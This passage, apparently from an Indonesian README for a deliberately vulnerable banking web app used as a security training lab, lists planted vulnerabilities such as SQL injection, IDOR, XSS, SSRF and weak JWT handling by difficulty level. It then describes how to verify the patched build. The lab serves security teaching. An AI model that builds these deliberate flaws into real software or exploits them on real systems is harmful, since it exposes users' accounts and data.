[ ] SQLi login admin              (easy, medium)
[ ] Enumerasi username            (easy, medium)
[ ] Brute-force tanpa lockout     (easy, medium)
[ ] Token reset dapat diprediksi  (easy, medium)
[ ] Session fixation              (easy, medium)
[ ] Remember-me palsu             (easy, medium)
[ ] Kebijakan password lemah      (easy, medium)
[ ] Hash MD5 tanpa salt           (easy, medium)

Otorisasi
[ ] IDOR transaksi/struk          (easy, medium, hard)
[ ] IDOR profil API               (easy, medium, hard)
[ ] IDOR KYC                      (easy, medium)
[ ] IDOR klaim                    (easy, medium)
[ ] IDOR tiket                    (easy, medium)
[ ] Nasabah masuk /admin          (easy, medium)
[ ] Pemisahan tugas back-office   (easy, medium, hard)
[ ] Mass assignment role          (easy, medium, hard)
[ ] Path traversal unggahan       (easy, medium)
[ ] Open redirect                 (easy, medium, hard)

Injeksi & XSS
[ ] SQLi pencarian berita         (easy, medium, hard)
[ ] SQLi pencarian transaksi      (easy, medium, hard)
[ ] SQLi panel admin              (easy, medium, hard)
[ ] Command injection diagnostik  (easy, medium)
[ ] XSS reflected                  (easy, medium, hard)
[ ] XSS stored                     (easy, medium, hard)
[ ] XSS DOM                        (easy, medium, hard)

Logika bisnis
[ ] Transfer negatif              (easy, medium, hard)
[ ] Race condition                (easy, medium)
[ ] PIN dilewati                  (easy, medium)
[ ] Transfer lewat GET            (easy, medium)
[ ] Klaim di luar batas           (easy, medium)
[ ] Klaim kumulatif               (hard)
[ ] Kalkulator dimanipulasi       (easy, medium, hard)

Infrastruktur & API
[ ] SSRF webhook                  (easy, medium, hard)
[ ] JWT secret lemah / alg none   (easy, medium)
[ ] CORS terbuka                  (easy, medium)
[ ] Rate limit API tidak ada      (easy, medium)
[ ] Rate limit dapat dilewati     (hard)
[ ] CSRF                          (easy, medium, hard untuk multipart)
[ ] Cookie tanpa flag             (easy, medium)
[ ] Security header hilang        (easy, medium)
[ ] Endpoint debug/backup/.git    (easy, medium)
[ ] robots.txt sensitif           (easy, medium, hard)
[ ] Detail error verbose          (easy, medium)
[ ] Catatan internal terekspos    (easy, medium, hard)
```

---

## 14. Menguji Perbaikan

Jalankan semua payload di atas pada `LAB_LEVEL=patched`. Yang diharapkan:

- Login SQLi → `401`; panel admin → `403` untuk nasabah; `cs123` → `403`.
- Semua `?account_id=`/`?user_id=`/`/kyc/download/<id>` asing → `403`.
- Semua pencarian & filter → hasil kosong untuk kutip tunggal; tidak ada traceback.
- Path traversal → `404`/`403`; nama file unggahan diacak.
- SSRF → ditolak sebelum permintaan keluar.
- JWT palsu → `401`; CORS hanya origin sendiri.
- XSS → teks inert (autoescape) di semua konteks.

Suite verifikasi otomatis di folder `tests/` mencetak hasil per level dan keluar
dengan kode non-zero bila ada yang tidak sesuai:

```bash
python tests/run_all.py            # semua modul, keempat level
python tests/run_all.py hard       # satu level saja
python tests/verify_admin.py       # satu modul saja
```

---

## 15. Catatan Jujur tentang Cakupan

Tiga kunci di `FEATURE_MATRIX` hanya bersifat **deskriptif** dan tidak punya endpoint
khusus di aplikasi ini:

| Kunci | Status |
|---|---|
| `xxe_import` | Dideklarasikan pada matriks (`V` hanya di easy). Tidak ada endpoint impor XML. |
| `insecure_deserialization` | Dideklarasikan (`V` di easy/medium). Tidak ada jalur impor pickle/base64. |

Keduanya didokumentasikan sebagai *design intent* agar matriks lengkap, bukan sebagai
latihan yang dapat dijalankan. `admin_role_separation` **memiliki** jalur nyata pada
`hard` — lihat bagian 3.7.
